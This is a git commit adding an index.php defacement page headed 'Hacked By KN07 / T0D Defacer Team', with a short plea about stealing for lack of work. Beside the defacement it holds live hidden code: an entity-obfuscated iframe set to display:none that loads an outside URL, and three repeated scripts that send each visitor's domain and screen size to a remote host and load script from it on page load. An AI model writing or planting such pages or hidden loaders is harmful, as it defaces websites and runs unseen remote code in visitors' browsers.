be9d8216cab16dd6e5fe694599be13dd14871122
eaeaeaea4 <44049369+eaeaeaea4@users.noreply.github.com>
2018-10-11 13:09:41 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,39 @@
+
+
+
+<html>
+<head>
+        <link href='https://fonts.googleapis.com/css?family=Jolly+Lodger' rel='stylesheet' type='text/css'>
+	<link href='https://d30y9cdsu7xlg0.cloudfront.net/png/52929-200.png' rel='SHORTCUT ICON'/>
+	<style type='text/css'>
+		div {
+			color: red;
+			font-size: 100px;
+			text-align: center;
+			text-shadow: 1px 1px black;
+			font-family: 'Jolly Lodger', cursive;
+		    }
+		h1  {
+			color: white;
+			font-size: 60px;
+			text-align: center;
+			text-shadow: 1px 1px black;
+			font-family: 'Jolly Lodger', cursive;
+		    }
+	</style>
+	<title>KN07 Was Here</title>
+<meta name="description" meta content="KN07 Wuzz Here">
+</head>
+<body bgcolor='black'>
+<script type="text/javascript">if (typeof document.onselectstart!="undefined") {document.onselectstart=new Function ("return false");}else{document.onmousedown=new Function ("return false");document.onmouseup=new Function ("return true");}</script>
+<center>
+	<div>Hacked By KN07</div>
+<div>T0D Defacer Team</div>
+        <h1> 
+a thief who has no work, that is me
+why did I steal because I don't have a work :(<br>don't humble me because you have work<br>life is not as easy as what you think :(</h1><h1>KN07@hacker.com
+<center>
+<embed src="http://www.youtube.com/v/xqHvs_g9eOQ&amp;autoplay=1&amp;loop=1&amp;playlist=Y2V2iRTi1d0" type="application/x-shockwave-flash" wmode="transparent" height="1"width="1"></embed> 
+<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m%2bi3MYdmLpni17Jk%2fhAZ77uKNCeU%2fcqimJ0ZJ50N%2fXqaHvmwX8lVIo9TUQHp2fQzssQxj748IkDuMdAycIf20NhI%2fymk7JTkVeBc1sm3FkHIbCjJyEFbyEFwrvTU3y80nyk5kUw2GcHEAMf6wTyQ95yKo1ybqgR98GebVN9RFstxbFgGobTiHaHgLNnoBAsOMDimwLNxmzWXDDmEqC3q09zJbwaU3mO%2f6yutybyn36cl%2bCrTYjhIkH6XNgUKcg6EwDHAQbY0vG8LN7291EaOQ6r4hPG6yG8dS0%2beiS0LK%2bzhJlrMl%2f6tRMFhVnUhwIJfAfk0VrfOmo2QvlyFA%2bgrO6AFYzcDkXBowv3RtfgbkPbxucbJiaDIEbAOu9%2fUWKBacAgf06ELZupiGdRafL5gHY4tRD4L9Shl0WlvBsE1TLw9jR7QpX%2fXapQVsv5OWnY6chkc0mGREMZuK6TFY0R%2beq89aGgCZ9oP2Yph2YzWnegkMbb0dE43n0i6DZybSQvgK8skyPEhjGBcnH9OUVhjlMqROxqdJRujd" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mOCHG%2fwFQUZ66aMc2W19N8MLbzoeaB610nG5HjxCbdYh7KglrgZTbCVpJQm9pj%2fniMlCg19PGilb26SsoVimvb44AVE9jCewbjM7qh6jMjgTbMSCRdhNaRBx7Ke0iMzI%2bxjPIGO074e8wpvwWhODG0ZRy%2fCqz7CpRZ2uMQXwHsElfmrz9d01P4uSVx31N2D%2bl6gjdky521cA6BPeGYHTVji%2fuYRTHQ8OA9IVz3omZBM7a%2fYdhpOSXX7maBAQEag%2ftFNforgvG4LpFTzgDHeYEu8jNZUoXkWY9JYtwSeuvixpbxee3b2QnA2d9zYVRf06nuvHryj4vNypZeFF0WvXil7NBDDzrcHJpdj6rJgcHjUd30mnxbCxYwy6xIkV%2fKUthtqcQucr8XpLk1VUVfSBZIyzp5roK2NacdR6BYxkZDFRNtIn9QHVJzP5y0Mn0419sw7qiwJrOZ2i7JB7kTqQ6HkJZfYipJEe9PZSNu9N41C2kNU9oJKQlzSXZHWxoxDfAGMgikC1nMoO8hFNhpkCY5Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdKC1zXG2nK9Ol2Eblu3d5YWClVt4gC7SziNzM7jnI99P7QSpcbIAJ34kYgtKW%2fNGNbvonqUOoyj850oWzL1BhYGPK48IHn4CZlnnSEfTHcl8X7jZisQhcZrNgeP4UxMVcHMOdX%2fLBxj%2fWQ1RFoMJHz0jyX05tNdgyeyKN6F6DHwEa0TSHPorcMn4Bbmxwkw9IakxfuyPvOPDVo%2bvyD1K0u6evJ7QvzrQm4B6m3CWJzWyfC5OUvaD3xxmskNsyUja08POBKf0007j4etWNuCachJazKoO8bNgM1xQKDAN0LAEb1Z8skdnuMhwBt1T%2bP3X%2bLhUEok88qXJQtLMcy7qZFSEOm8lXsZmXPw85WUwGR11NouRy7d57Zm1%2bImmmMyw7Uwyc8eZoLO8iWM3RE9bZMqh5NG5kZwHL4JEPoZZ8r6LB1I9XcngEme5O531qIWmWepHXXWlXhsYMDxmZjR531WDnm18dktxjUVyzb%2fm%2bztkKoT07N6pQZgjlfGeTDJ5uSecqX%2bmmgbT33mlcWY1KaXYSag2yMK9Pqj2y9p3L44xGOYacI7XnbSFh9fTXwvJc" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
